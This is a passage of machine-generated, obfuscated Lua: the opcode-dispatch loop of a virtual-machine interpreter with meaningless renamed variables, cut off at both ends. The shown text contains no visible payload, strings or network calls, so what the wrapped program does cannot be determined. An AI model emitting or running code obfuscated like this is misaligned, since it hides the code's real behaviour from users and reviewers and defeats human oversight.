=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];end;elseif Fz_e>38 then local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];else Fz_b=Fz_a[3];end;elseif Fz_e<=41 then if Fz_e>40 then local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];if Fz_c[Fz_a[2]]then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];end;elseif Fz_e==42 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]-Fz_c[Fz_a[4]];else Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];end;elseif Fz_e<=50 then if Fz_e<=46 then if Fz_e<=44 then local Fz_d=Fz_a[2];local Fz_f=Fz_c[Fz_d+2];local Fz_e=Fz_c[Fz_d]+Fz_f;Fz_c[Fz_d]=Fz_e;if(Fz_f>0)then if(Fz_e<=Fz_c[Fz_d+1])then Fz_b=Fz_a[3];Fz_c[Fz_d+3]=Fz_e;end elseif(Fz_e>=Fz_c[Fz_d+1])then Fz_b=Fz_a[3];Fz_c[Fz_d+3]=Fz_e;end elseif Fz_e>45 then if(Fz_c[Fz_a[2]]~=Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else do return end;end;elseif Fz_e<=48 then if Fz_e==47 then local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_f[Fz_a[3]]=Fz_c[Fz_a[2]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];if(Fz_c[Fz_a[2]]==Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];if(Fz_c[Fz_a[2]]==Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e==49 then if(Fz_a[2]<Fz_c[Fz_a[4]])then Fz_b=Fz_a[3];else Fz_b=Fz_b+1;end;else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]%Fz_a[4];end;elseif Fz_e<=54 then if Fz_e<=52 then if Fz_e==51 then Fz_c[Fz_a[2]]=Fz_a[3];else local Fz_b=Fz_a[2]Fz_c[Fz_b]=Fz_c[Fz_b](Fz_g(Fz_c,Fz_b+1,Fz_a[3]))end;elseif Fz_e==53 then if(Fz_c[Fz_a[2]]<Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]*Fz_a[4];end;elseif Fz_e<=56 then if Fz_e>55 then local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]={};Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;else Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_c[Fz_a[4]];end;elseif Fz_e>57 then local Fz_e;Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))else Fz_n=Fz_a[2];end;elseif Fz_e<=88 then if Fz_e<=73 then if Fz_e<=65 then if Fz_e<=61 then if Fz_e<=59 then local Fz_d=Fz_a[2];local Fz_f=Fz_c[Fz_d+2];local Fz_e=Fz_c[Fz_d]+Fz_f;Fz_c[Fz_d]=Fz_e;if(Fz_f>0)then if(Fz_e<=Fz_c[Fz_d+1])then Fz_b=Fz_a[3];Fz_c[Fz_d+3]=Fz_e;end elseif(Fz_e>=Fz_c[Fz_d+1])then Fz_b=Fz_a[3];Fz_c[Fz_d+3]=Fz_e;end elseif Fz_e>60 then local Fz_a=Fz_a[2]Fz_c[Fz_a]=Fz_c[Fz_a](Fz_c[Fz_a+1])else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];if(Fz_c[Fz_a[2]]==Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e<=63 then if Fz_e==62 then local Fz_e;Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))else local Fz_e;Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_a[4];end;elseif Fz_e==64 then if not Fz_c[Fz_a[2]]then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else local Fz_a=Fz_a[2]Fz_c[Fz_a]=Fz_c[Fz_a](Fz_c[Fz_a+1])end;elseif Fz_e<=69 then if Fz_e<=67 then if Fz_e>66 then Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];else if(Fz_c[Fz_a[2]]==Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e>68 then local Fz_e;Fz_f[Fz_a[3]]=Fz_c[Fz_a[2]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];else Fz_f[Fz_a[3]]=Fz_c[Fz_a[2]];end;elseif Fz_e<=71 then if Fz_e>70 then Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_a[4];else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]%Fz_a[4];end;elseif Fz_e>72 then local Fz_h;local Fz_g;local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]={};Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2];Fz_g=Fz_c[Fz_e]Fz_h=Fz_c[Fz_e+2];if(Fz_h>0)then if(Fz_g>Fz_c[Fz_e+1])then Fz_b=Fz_a[3];else Fz_c[Fz_e+3]=Fz_g;end elseif(Fz_g<Fz_c[Fz_e+1])then Fz_b=Fz_a[3];else Fz_c[Fz_e+3]=Fz_g;end else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]*Fz_a[4];end;elseif Fz_e<=80 then if Fz_e<=76 then if Fz_e<=74 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]-Fz_a[4];elseif Fz_e>75 then Fz_c[Fz_a[2]]={};else if(Fz_a[2]<Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e<=78 then if Fz_e>77 then Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;else local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];end;elseif Fz_e==79 then Fz_c[Fz_a[2]]=#Fz_c[Fz_a[3]];else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]/Fz_a[4];end;elseif Fz_e<=84 then if Fz_e<=82 then if Fz_e>81 then local Fz_b=Fz_a[2]Fz_c[Fz_b]=Fz_c[Fz_b](Fz_g(Fz_c,Fz_b+1,Fz_a[3]))else local Fz_j=Fz_j[Fz_a[3]];local Fz_g;local Fz_e={};Fz_g=Fz_o({},{__index=function(Fz_b,Fz_a)local Fz_a=Fz_e[Fz_a];return Fz_a[1][Fz_a[2]];end,__newindex=function(Fz_c,Fz_a,Fz_b)local Fz_a=Fz_e[Fz_a]Fz_a[1][Fz_a[2]]=Fz_b;end;});for Fz_f=1,Fz_a[4]do Fz_b=Fz_b+1;local Fz_a=Fz_d[Fz_b];if Fz_a[1]==88 then Fz_e[Fz_f-1]={Fz_c,Fz_a[3]};else Fz_e[Fz_f-1]={Fz_h,Fz_a[3]};end;Fz_k[#Fz_k+1]=Fz_e;end;Fz_c[Fz_a[2]]=Fz_i(Fz_j,Fz_g,Fz_f);end;elseif Fz_e>83 then local Fz_e;Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];else local Fz_e;Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_c[Fz_e+1])end;elseif Fz_e<=86 then if Fz_e>85 then local Fz_b=Fz_a[2]Fz_c[Fz_b](Fz_g(Fz_c,Fz_b+1,Fz_a[3]))else local Fz_d=Fz_a[3];local Fz_b=Fz_c[Fz_d]for Fz_a=Fz_d+1,Fz_a[4]do Fz_b=Fz_b..Fz_c[Fz_a];end;Fz_c[Fz_a[2]]=Fz_b;end;elseif Fz_e==87 then Fz_c[Fz_a[2]]=Fz_a[3];else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];end;elseif Fz_e<=103 then if Fz_e<=95 then if Fz_e<=91 then if Fz_e<=89 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]/Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]-Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]/Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]*Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_b=Fz_a[3];elseif Fz_e>90 then local Fz_a=Fz_a[2]Fz_c[Fz_a](Fz_c[Fz_a+1])else local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];end;elseif Fz_e<=93 then if Fz_e==92 then local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]%Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=F